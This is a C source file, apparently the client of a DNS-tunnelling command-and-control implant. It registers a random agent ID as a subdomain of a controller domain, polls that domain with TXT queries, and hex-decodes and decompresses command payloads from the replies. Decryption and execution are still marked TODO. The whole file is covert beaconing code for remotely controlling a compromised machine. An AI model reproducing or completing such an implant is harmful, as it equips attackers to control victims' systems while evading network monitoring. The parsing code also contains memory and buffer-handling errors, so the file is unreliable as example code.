#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <string.h>

#include "utils.h"
#include "options.h"
#include "compression.h"

/* DNS STUFF */
#include <sys/types.h>
#include <resolv.h>
#include <ctype.h>
/* DNS STUFF */

// https://stackoverflow.com/a/1941331
#ifdef DEBUG
#define Dprintf(fmt, args...) printf(fmt, ##args)
#else
#define Dprintf(fmt, args...)
#endif

typedef enum
{
    Idle,
    Error,
    Command,
} status_t;

const char *resp_idle = "v=B2B3FE1C";
const char *resp_error = "v=D31CFAA4";
const char *resp_cmd = "v=A9F466E8";

typedef struct Client
{
    char *domain;

    char agent_id[6];
    char agent_id_hex[6 * 2 + 1];
    char checkin_domain[256];

    char command[255];

    status_t status;
} client_t;

struct Client *init_client()
{

    struct Client *client = malloc(sizeof(*client));

    client->domain = DOMAIN;
    client->status = Idle;

    rand_str(client->agent_id, sizeof(client->agent_id) - 1);
    str_to_hex_str(client->agent_id, client->agent_id_hex);

    snprintf(client->checkin_domain,
             sizeof(client->checkin_domain),
             "%s.%s",
             client->agent_id_hex,
             client->domain);

#ifdef DEBUG
    Dprintf("client init: state          = %d\n", client->status);
    Dprintf("client init: domain         = %s\n", client->domain);
    Dprintf("client init: agent_id       = %s\n", client->agent_id);
    Dprintf("client init: agent_id_hex   = %s\n", client->agent_id_hex);
    Dprintf("client init: checkin_domain = %s\n", client->checkin_domain);
#endif

    return client;
}

void poll(client_t *client)
{

    u_char answer[255]; // a single TXT string is max 255
    char txt[255];
    int len;
    ns_msg msg;
    ns_rr rr;

    len = res_query(client->checkin_domain, ns_c_in, ns_t_txt, answer, sizeof(answer));

    if (len <= 0)
        return;

    if (ns_initparse(answer, len, &msg) < 0)
        return;

    if (ns_msg_count(msg, ns_s_an) > 1)
        Dprintf("[d] dns response had more than 1 answers. we are only taking the first\n");

    if (ns_parserr(&msg, ns_s_an, 0, &rr)) // take the first rr, 0
        return;

    if (ns_rr_type(rr) != ns_t_txt)
        return;

    // first byte seems to be a size byte maybe?
    strncpy(txt, (char *)ns_rr_rdata(rr) + 1, ns_rr_rdlen(rr));
    // hex_dump("txt", &txt, sizeof(txt));

    if (strstr(txt, resp_idle) != NULL)
    {
        client->status = Idle;
        return;
    }

    if (strstr(txt, resp_error) != NULL)
    {
        client->status = Error;
        return;
    }

    if (strstr(txt, resp_cmd) != NULL)
    {
        // double check and make sure we have ,p=
        if (strstr(txt, ",p=") == NULL)
        {
            // something is wrong, lets ignore that response
            client->status = Idle;
            return;
        }

        // when we're in a cmd state, we are expecting the bytes
        // to process as the value for p.
        //  ie. p=ffffff
        char *command;

        char *token = strtok(txt, "=");
        while (token != NULL)
        {
            command = (char *)malloc(sizeof(token) + 1);
            command = token;

            // continue scanning
            token = strtok(NULL, "=");
        }

        // str hex decode to byte array
        char gz_bytes[strlen(command) / 2];
#ifdef DEBUG
        int w = hex_str_to_char(command, gz_bytes);
        hex_dump("gz_bytes", &gz_bytes, sizeof(gz_bytes));

        Dprintf(" - command hex %s\n", command);
        Dprintf(" - command hex str len: %lu\n", strlen(command));
        Dprintf(" - command decoding to gz_bytes wote %d bytes\n", w);
        Dprintf(" - gz_bytes len: %lu\n", sizeof(gz_bytes));
#else
        hex_str_to_char(command, gz_bytes);
#endif

        // decompress
        char inflated[255];
        u_int olen = 0;
        int zres = zdepress(gz_bytes, sizeof(gz_bytes), &olen, inflated);
        if (zres != 0)
        {
            Dprintf("decompression failed with status: %d\n", zres);
            return;
        }

        hex_dump("inflated", &inflated, olen);

        // TODO: decrypt, json decode to get raw command
        return;
    }
}
